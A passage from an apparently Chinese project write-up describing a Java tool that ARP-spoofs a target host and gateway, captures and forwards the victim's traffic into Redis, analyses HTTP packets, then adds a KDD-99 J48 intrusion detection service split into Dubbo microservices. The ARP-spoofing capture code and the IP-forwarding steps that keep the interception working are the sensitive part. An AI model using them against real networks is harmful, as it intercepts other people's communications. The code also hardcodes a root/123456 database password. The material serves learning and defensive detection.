                <span class="c1">//如果这个数据包的目的IP地址是目标主机的IP地址，那么说明是下行链路的数据包</span>
                <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">.</span><span class="na">dst_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">config</span><span class="o">.</span><span class="na">getDestIp</span><span class="o">())){</span>
                  <span class="n">savePacket</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
                  <span class="n">forward</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">,</span> <span class="n">dstMACBT</span><span class="o">);</span>
                <span class="o">}</span>
              <span class="o">}</span>
            <span class="o">}</span>

            <span class="c1">//检查是否是ARP包</span>
            <span class="k">if</span><span class="o">(</span><span class="n">packet</span> <span class="k">instanceof</span> <span class="nc">ARPPacket</span><span class="o">){</span>
              <span class="o">....</span>
            <span class="o">}</span>
          <span class="o">}</span>
        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Throwable</span> <span class="n">e</span><span class="o">){</span>
          <span class="o">...</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">};</span>
  <span class="n">executor</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">task</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>接下来测试欺骗能否成功，运行程序，并访问请求<code class="language-plaintext highlighter-rouge">attack/startAttack</code>，此时服务端会开启两个子线程：</p><ol><li>一个线程用于发送欺骗包给目标主机和网关，进行欺骗。</li><li>一个线程从网卡上抓包，看看能否抓到目标主机访问<code class="language-plaintext highlighter-rouge">filterDomain</code>的数据包。</li></ol><p>首先在目标主机上查看ARP表，判断是否欺骗成功：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329191331592.png" alt="image-20210329191331592" /></p><p>如上图所示，已经成功将目标主机的网关MAC地址修改为了本地主机的MAC地址，因此目标主机发送的数据包都会经过本地主机的网卡。接下来我们在目标主机上访问<code class="language-plaintext highlighter-rouge">filterDomain</code>，并在服务端开启第二个线程抓包。结果失败了，压根没抓到目标主机的数据包，为什么呢？检查发现目标主机已经不能访问Internet了，发不出包。</p><p>既然MAC地址已经是本地主机了，说明目标主机的数据包应该能够发送到本地主机的网卡上，有可能是本地主机的网卡没开启IP转发，因为即使数据包接收到了，程序也调用了转发方法，但是底层的设备不支持IP转发，目标主机仍旧是无法访问Internet的。</p><p>所以我们尝试在本地主机上开启IP转发功能：</p><ol><li>在MAC上：<ol><li>开启IP转发：sudo sysctl -w net.inet.ip.forwarding=1</li><li><div class="table-wrapper"><table><tbody><tr><td>查看IP转发已开启（为1）：sudo sysctl -a<td>grep net.inet.ip.forwarding</table></div></li></ol></li><li>在windows上：<ol><li>开启IP转发：以管理员身份打开注册表编辑器，定位注册项HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/Tcpip/Parameters，选择项目IPEnableRouter并修改数值为1</li></ol></li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329192456978.png" alt="image-20210329192456978" /></p><p>本地主机IP转发开启成功，继续测试：在目标主机上<code class="language-plaintext highlighter-rouge">ping www.baidu.com</code>，抓到一个从网关发到目标主机的ICMP数据包，我们把它转存入Redis：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329193000045.png" alt="image-20210329193000045" /></p><p>至此基本的攻击算是成功了。</p><p>为了后面的数据包分析功能，我决定把数据包存在redis的list结构中，list集合的名称按<code class="language-plaintext highlighter-rouge">batch_id</code>命名，list中的value就是每个序列化后的数据包实体。</p><p>开放攻击，查看前端数据统计，成功抓到了许多数据包。但是很明显有一个问题：只有下行的数据包被抓到了，上行的数据包没有被抓到。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329204233419.png" alt="image-20210329204233419" /></p><p>我感觉是本地主机开了IP转发的原因，网卡在接收到目标主机访问百度的数据包后，进行IP转发，把源MAC地址修改为了本地主机的MAC地址，然后将数据包转发给网关，所以当数据包的MAC地址为本地主机的MAC地址时，本程序将其过滤掉了。看看问题代码:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c1">//如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包</span>
<span class="k">if</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">.</span><span class="na">src_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">config</span><span class="o">.</span><span class="na">getDestIp</span><span class="o">())){</span>
  <span class="c1">//如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的数据包，需要忽略</span>
  <span class="k">if</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">.</span><span class="na">datalink</span> <span class="k">instanceof</span> <span class="nc">EthernetPacket</span><span class="o">){</span>
    <span class="nc">EthernetPacket</span> <span class="n">eth</span> <span class="o">=</span> <span class="o">(</span><span class="nc">EthernetPacket</span><span class="o">)</span> <span class="n">ipPacket</span><span class="o">.</span><span class="na">datalink</span><span class="o">;</span>
    <span class="nc">String</span> <span class="n">macFromCap</span> <span class="o">=</span> <span class="n">eth</span><span class="o">.</span><span class="na">getSourceAddress</span><span class="o">();</span>
    <span class="k">if</span><span class="o">(</span><span class="n">macFromCap</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">config</span><span class="o">.</span><span class="na">getDestMac</span><span class="o">())){</span><span class="c1">//卡在这了</span>
      <span class="n">savePacket</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
  <span class="n">forward</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">,</span> <span class="n">gateMACBT</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>将MAC地址的限制放开，因为在外层if逻辑中已经明确判断出IP地址是目标主机的IP地址了，那么就不用MAC地址过滤了，把最内层if逻辑删除。重新抓包：抓到了上行链路的数据包，基本上是ping 1个，回应2个。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329213112283.png" alt="image-20210329213112283" /></p><h4 id="553-停止攻击">5.5.3 停止攻击</h4><p>点击attack stop按钮后，会向服务器发送请求<code class="language-plaintext highlighter-rouge">/attack/stopAttack</code>。将标识位<code class="language-plaintext highlighter-rouge">attacking</code>置为<code class="language-plaintext highlighter-rouge">false</code>，并返回<code class="language-plaintext highlighter-rouge">batch_id</code>到前端。前端随即将<code class="language-plaintext highlighter-rouge">batch_id</code>作为参数向服务器发起请求<code class="language-plaintext highlighter-rouge">analyse/analysisByBatchId?batchId=1</code>，开始分析数据包。</p><h3 id="56-数据包分析">5.6 数据包分析</h3><p>所有被抓取的数据包都被封装到名为<code class="language-plaintext highlighter-rouge">CapturedXXXPacket</code>的pojo类中，并序列化到redis。当服务端接收到<code class="language-plaintext highlighter-rouge">analysisByBatchId</code>请求后，会根据批次读出<code class="language-plaintext highlighter-rouge">CapturedXXXPacket</code>数据，然后对数据包进行分析。以TCP包为例，在分析过程中会将HTTP和HTTPS包从其他的TCP包中过滤出来，另行存放。假设当前在分析一个HTTP包:</p><ol><li>首先根据端口号过滤，源或者目地端口为80端口的数据包留下</li><li>然后将TCP的ACK号作为Key，将TCP报文段重组，通过<code class="language-plaintext highlighter-rouge">appendPacket</code>实现</li><li>最后将所有有效的HTTP包封装为<code class="language-plaintext highlighter-rouge">AnalyzedHttpPacket</code>并序列化到redis中。</li></ol><p>主要代码如下：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kd">private</span> <span class="kt">long</span> <span class="nf">analysisHttp</span><span class="o">(</span><span class="nc">Integer</span> <span class="n">batchId</span><span class="o">){</span>
  <span class="k">this</span><span class="o">.</span><span class="na">analyzing</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
  <span class="nc">List</span><span class="o">&lt;</span><span class="nc">CapturedTCPPacket</span><span class="o">&gt;</span> <span class="n">fromList</span> <span class="o">=</span> <span class="o">(</span><span class="nc">List</span><span class="o">&lt;</span><span class="nc">CapturedTCPPacket</span><span class="o">&gt;)</span> <span class="n">redisMapper</span><span class="o">.</span><span class="na">getFromList</span><span class="o">(</span><span class="nc">AttackKey</span><span class="o">.</span><span class="na">cap_packet</span><span class="o">,</span> <span class="s">"batch_id"</span> <span class="o">+</span> <span class="n">batchId</span> <span class="o">+</span> <span class="s">"_TCP_list"</span><span class="o">,</span> <span class="nc">CapturedTCPPacket</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
  <span class="nc">HttpPacketFilter</span> <span class="n">httpPacketFilter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpPacketFilter</span><span class="o">();</span>
  <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">Long</span><span class="o">,</span> <span class="nc">IAnalysisRealm</span><span class="o">&gt;</span> <span class="n">analysisRealmMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
  <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="k">for</span> <span class="o">(</span><span class="nc">CapturedTCPPacket</span> <span class="n">tcpCapturedPacket</span> <span class="o">:</span> <span class="n">fromList</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">TCPPacket</span> <span class="n">tcpPacket</span> <span class="o">=</span> <span class="n">tcpCapturedPacket</span><span class="o">.</span><span class="na">getPacket</span><span class="o">();</span>
    <span class="c1">//根据端口号判断是否是HTTP协议</span>
    <span class="k">if</span><span class="o">(!</span><span class="n">httpPacketFilter</span><span class="o">.</span><span class="na">filter</span><span class="o">(</span><span class="n">tcpPacket</span><span class="o">)){</span>

      <span class="k">if</span> <span class="o">(</span><span class="n">tcpPacket</span><span class="o">.</span><span class="na">getData</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">tcpPacket</span><span class="o">.</span><span class="na">getData</span><span class="o">().</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">size</span><span class="o">++;</span>
        <span class="c1">//根据TCP包的ACK号作为Key</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">analysisRealmMap</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">tcpPacket</span><span class="o">.</span><span class="na">getAckNum</span><span class="o">()))</span> <span class="o">{</span>
          <span class="nc">HttpAnalysisRealm</span> <span class="n">httpAnalysisRealm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpAnalysisRealm</span><span class="o">();</span>
          <span class="n">httpAnalysisRealm</span><span class="o">.</span><span class="na">initPacket</span><span class="o">(</span><span class="n">tcpCapturedPacket</span><span class="o">.</span><span class="na">getBatchId</span><span class="o">(),</span> <span class="n">tcpCapturedPacket</span><span class="o">.</span><span class="na">isUpStream</span><span class="o">(),</span> <span class="n">tcpPacket</span><span class="o">);</span>
          <span class="n">analysisRealmMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tcpPacket</span><span class="o">.</span><span class="na">getAckNum</span><span class="o">(),</span> <span class="n">httpAnalysisRealm</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
          <span class="n">analysisRealmMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">tcpPacket</span><span class="o">.</span><span class="na">getAckNum</span><span class="o">()).</span><span class="na">appendPacket</span><span class="o">(</span><span class="n">tcpPacket</span><span class="o">);</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>

  <span class="n">saveRealmPackets</span><span class="o">(</span><span class="n">analysisRealmMap</span><span class="o">,</span> <span class="n">batchId</span><span class="o">,</span> <span class="k">new</span> <span class="nc">AnalyzedHttpPacket</span><span class="o">());</span>
  <span class="k">this</span><span class="o">.</span><span class="na">analyzing</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
  <span class="k">return</span> <span class="n">size</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p>其他数据包的处理类似，不再赘述。</p><h3 id="57-前端数据包可视化">5.7 前端数据包可视化</h3><p>在前端设置到过滤条件后，点击Filter按钮，提交post请求<code class="language-plaintext highlighter-rouge">/analyze/filterPackets</code>到服务器。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/Snip20210406_157.png" alt="Snip20210406_157" /></p><p>服务端处理请求，解析参数。先从redis中按照batchId查询出数据包，然后根据过滤条件过滤，最终返回数据包。实际上应当以过滤条件作为查询语句去数据库中查询，这样能够减少数据库的查询时间并减少网络通信开销，在高并发场景下提高效率。这里用redis，没办法特别自由地查询数据。</p><p>查询后的结果如下：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210406204426228.png" alt="image-20210406204426228" /></p><h2 id="6-入侵检测">6. 入侵检测</h2><p>接下来将在以上项目的基础上，实现简单的入侵检测系统。</p><p>入侵检测一共分为四个步骤：</p><ol><li><strong>抓取数据包</strong>：一般的IDS通常可以挂接在网关上，通过连接集线器或者分路器，把经由网关的数据包同样转发到IDS上。在本场景下，并无上述硬件条件，因此就按上一节中的方法来捕获数据包。</li><li><strong>数据包分组</strong>：将数据包先按设备分组，再按时间戳分组。具体就是先按源IP地址分组，在同个源IP分组内按捕获的时间窗口分组，比如10秒内的数据包放在一组，下个10秒的数据包放在一组。</li><li><strong>特征提取</strong>：从数据包中提取有状态特征和无状态特征。<ol><li>无状态特征：<ol><li>Packet Size：通常DoS攻击的数据包都很小，例如SYN泛洪</li><li>包间间隔：异常流量通常是集中式的。包间间隔的特征可以直接将时间差作为特征，也可以将时间差的差分作为特征。</li><li>协议：正常流量的协议是较为丰富的，异常流量通常TCP的包相当多。</li></ol></li><li>有状态特征：<ol><li>带宽：统计10秒窗口内的平均带宽。</li><li>目地IP地址：如果经常出现新的目的IP地址，很有可能是遭受了攻击。统计两个时间窗口内目的IP地址的变化作为特征。</li></ol></li></ol></li><li><strong>二分类</strong>：将分类器的输出结果作为是否遭受攻击的依据。<ol><li>KNN</li><li>LSVM</li><li>决策树</li><li>随机森林</li></ol></li></ol><p>接下来要解决几个问题：</p><ol><li>数据集如何获取？</li><li>入侵检测服务在哪里实现？</li></ol><p>首先关于入侵检测服务如何实现的问题，有两个解决方案：</p><ol><li>直接在同一个服务端实现，后台开一个线程定时从数据库中读数据包，然后分析。</li><li>划分微服务，用Dubbo实现。</li></ol><p>数据集采用KDD cup 1999数据集，关于该数据集的详细分析见<a href="https://blog.csdn.net/qq_38384924/article/details/97128744">链接</a>。</p><p>主要用j48 tree来实现分类器，将训练好的模型保存在web端，便于读取，训练过程略了，模型文件见src/model目录。</p><h2 id="7-微服务拆分">7. 微服务拆分</h2><p>用dubbo作为RPC框架，zookeeper作为注册中心，将数据包分析服务、入侵检测服务、邮件发送服务拆分出来，通过dubbo注册到zookeeper上，实现远程调用。</p><p>在使用dubbo的时候，需要注意spring-cloud版本和spring-boot版本的对应关系。建议在创建Spring-boot项目的时候，使用阿里的镜像源创建，然后勾选spring-cloud-alibaba中的dubbo组件，这样就无需再处理版本对应，创建出来的就是合适的版本。</p><p>我的springboot版本是<code class="language-plaintext highlighter-rouge">2.3.7-RELEASE</code>，Springcloud版本是<code class="language-plaintext highlighter-rouge">2.2.1-RELEASE</code>，在使用时报错：</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cannot access its superinterface org.springframework.cloud.openfeign.Targeter
</pre></table></code></div></div><p>将<code class="language-plaintext highlighter-rouge">spring-boot-devtools</code>依赖删除即可，这应该是官方的问题。</p><h3 id="模块拆分">模块拆分</h3><p><strong>api模块</strong>：创建一个api模块（普通maven工程），将服务接口、服务模型、服务异常等均放在 API 包中。</p><p><strong>provider模块</strong>：每一种服务对应一个provider模块（Springboot工程）：</p><ul><li>analyze-service-provider：数据包分析模块</li><li>ids-service-provider：入侵检测模块</li><li>mail-service-provider：邮件发送模块</li></ul><p><strong>服务调用</strong>：在backend模块中调用上述服务。</p><h3 id="入侵检测服务">入侵检测服务</h3><p>首先在api模块中编写接口<code class="language-plaintext highlighter-rouge">IIDSService</code>:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.hyc.interfaces</span><span class="o">;</span>

<span class="cm">/**
 * @author kol Huang
 * @date 2021/4/12
 */</span>
<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">IIDSService</span> <span class="o">{</span>

  <span class="kt">boolean</span> <span class="nf">isAttacked</span><span class="o">();</span>

<span class="o">}</span>
</pre></table></code></div></div><p>在analyze-service-provider模块中编写IIDSService接口的实现类<code class="language-plaintext highlighter-rouge">IDSServiceImpl</code>，代码的大体框架如下所示：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isAttacked</span><span class="o">()</span> <span class="o">{</span>
        <span class="c1">//判断是否被攻击</span>
        <span class="c1">//1. 从mysql中查询验证集</span>
<span class="c1">//        ConverterUtils.DataSource source = null;</span>
        <span class="nc">Instances</span> <span class="n">data</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">InstanceQuery</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InstanceQuery</span><span class="o">();</span>
            <span class="n">query</span><span class="o">.</span><span class="na">setUsername</span><span class="o">(</span><span class="s">"root"</span><span class="o">);</span>
            <span class="n">query</span><span class="o">.</span><span class="na">setPassword</span><span class="o">(</span><span class="s">"123456"</span><span class="o">);</span>
            <span class="c1">//读100条，先处理</span>
            <span class="n">query</span><span class="o">.</span><span class="na">setQuery</span><span class="o">(</span><span class="s">"select * from features"</span><span class="o">);</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="na">retrieveInstances</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="c1">//2. 读取模型</span>
        <span class="no">J48</span> <span class="n">j48Tree</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">j48Tree</span> <span class="o">=</span> <span class="o">(</span><span class="no">J48</span><span class="o">)</span> <span class="nc">SerializationHelper</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="s">"src/model/j48.model"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="c1">//3. 多分类</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">Instance</span> <span class="n">datum</span> <span class="o">:</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="kt">int</span> <span class="n">type</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">j48Tree</span><span class="o">.</span><span class="na">classifyInstance</span><span class="o">(</span><span class="n">datum</span><span class="o">);</span>
                <span class="n">table</span><span class="o">[</span><span class="n">type</span><span class="o">]++;</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="c1">//4. 统计判别：当此次分析过程中，有百分之80的数据记录被判别为攻击流量，那么就说明发生了攻击</span>
        <span class="kt">int</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">norm</span> <span class="o">=</span> <span class="n">table</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">table</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">){</span>
            <span class="n">sum</span> <span class="o">+=</span> <span class="n">table</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
        <span class="o">}</span>
        <span class="kt">double</span> <span class="n">at_rate</span> <span class="o">=</span> <span class="n">norm</span> <span class="o">*</span> <span class="mf">0.1</span> <span class="o">/</span> <span class="n">sum</span><span class="o">;</span>

        <span class="k">return</span> <span class="n">at_rate</span> <span class="o">&gt;=</span> <span class="mf">0.8</span><span class="o">;</span>
    <span class="o">}</span>
</pre></table></code></div></div><p>这里有些粗糙了，应当统计所有的攻击类型，然后封装到一个DTO里返回，这样可以在邮件服务里面添加攻击的详细信息。</p><p>在api模块下的pojo包中创建<code class="language-plaintext highlighter-rouge">Features</code>类，用于封装流量的数据特征，字段如下：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre><td class="rouge-code"><pre><span class="kd">private</span> <span class="kt">long</span> <span class="n">id</span><span class="o">;</span>
<span class="c1">//TCP连接基本特征</span>
<span class="c1">//TCP持续时间，默认设为0，因为无法获取</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">duration</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="c1">//协议类型：TCP、UDP、ICMP</span>
<span class="kd">private</span> <span class="nc">String</span> <span class="n">protocol_type</span><span class="o">;</span>
<span class="c1">//目标主机的网络服务类型：70种！</span>
<span class="kd">private</span> <span class="nc">String</span> <span class="n">service</span><span class="o">;</span>
<span class="c1">//连接正常或错误的状态：11种</span>
<span class="kd">private</span> <span class="nc">String</span> <span class="n">flag</span><span class="o">;</span>
<span class="c1">//从源主机到目标主机的数据的字节数</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">src_byte</span><span class="o">;</span>
<span class="c1">//从目标主机到源主机的数据的字节数</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">dst_byte</span><span class="o">;</span>
<span class="c1">//若连接来自/送达同一个主机/端口则为1，否则为0，检查是否是land dos攻击</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">land</span><span class="o">;</span>
<span class="c1">//错误分段的数量，连续类型，范围是 [0, 3]</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">wrong_fragment</span><span class="o">;</span>
<span class="c1">//加急包的个数，连续类型，范围是[0, 14]。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">urgent</span><span class="o">;</span>
<span class="c1">//访问系统敏感文件和目录的次数，连续，范围是 [0, 101]</span>

<span class="c1">//TCP连接内容特征</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">hot</span><span class="o">;</span>
<span class="c1">//登录尝试失败的次数。连续，[0, 5]。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">num_failed_logins</span><span class="o">;</span>
<span class="c1">//成功登录则为1，否则为0，离散，0或1。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">logged_in</span><span class="o">;</span>
<span class="c1">//compromised条件（**）出现的次数，连续，[0, 7479]。</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">num_compromised</span><span class="o">;</span>
<span class="c1">//若获得root shell 则为1，否则为0，离散，0或1。root_shell是指获得超级用户权限。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">root_shell</span><span class="o">;</span>
<span class="c1">// 若出现”su root” 命令则为1，否则为0，离散，0或1。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">su_attempted</span><span class="o">;</span>
<span class="c1">//root用户访问次数，连续，[0, 7468]。</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">num_root</span><span class="o">;</span>
<span class="c1">//文件创建操作的次数，连续，[0, 100]。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">num_file_creations</span><span class="o">;</span>
<span class="c1">//一个FTP会话中出站连接的次数，连续，0。数据集中这一特征出现次数为0。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">num_outbound_cmds</span><span class="o">;</span>
<span class="c1">//登录是否属于“hot”列表（***），是为1，否则为0，离散，0或1。例如超级用户或管理员登录。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">is_hot_login</span><span class="o">;</span>
<span class="c1">//若是guest 登录则为1，否则为0，离散，0或1。</span>
<span class="kd">private</span> <span class="kt">byte</span> <span class="n">is_guest_login</span><span class="o">;</span>

<span class="c1">//基于时间的网络流量统计特征</span>
<span class="c1">// 过去两秒内，与当前连接具有相同的目标主机的连接数，连续，[0, 511]。</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">count</span><span class="o">;</span>
<span class="c1">//过去两秒内，与当前连接具有相同服务的连接数，连续，[0, 511]。</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">srv_count</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同目标主机的连接中，出现“SYN” 错误的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">serror_rate</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同服务的连接中，出现“SYN” 错误的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">srv_serror_rate</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同目标主机的连接中，出现“REJ” 错误的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">rerror_rate</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同服务的连接中，出现“REJ” 错误的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">srv_rerror_rate</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同目标主机的连接中，与当前连接具有相同服务的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">same_srv_rate</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同目标主机的连接中，与当前连接具有不同服务的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">diff_srv_rate</span><span class="o">;</span>
<span class="c1">//过去两秒内，在与当前连接具有相同服务的连接中，与当前连接具有不同目标主机的连接的百分比，连续，[0.00, 1.00]。</span>
<span class="kd">private</span> <span class="kt">double</span> <span class="n">srv_diff_host_rate</span><span class="o">;</span>



<span class="c1">//基于主机的网络流量统计特征</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机的连接数，连续，[0, 255]。</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">dst_host_count</span><span class="o">;</span>
<span class="c1">//前100个连接中，与当前连接具有相同目标主机相同服务的连接数，连续，[0, 255]。</span>
<span class="kd">private</span> <span class="kt">int</span> <span class="n">dst_host_srv_count</span><span class="o">;</span>
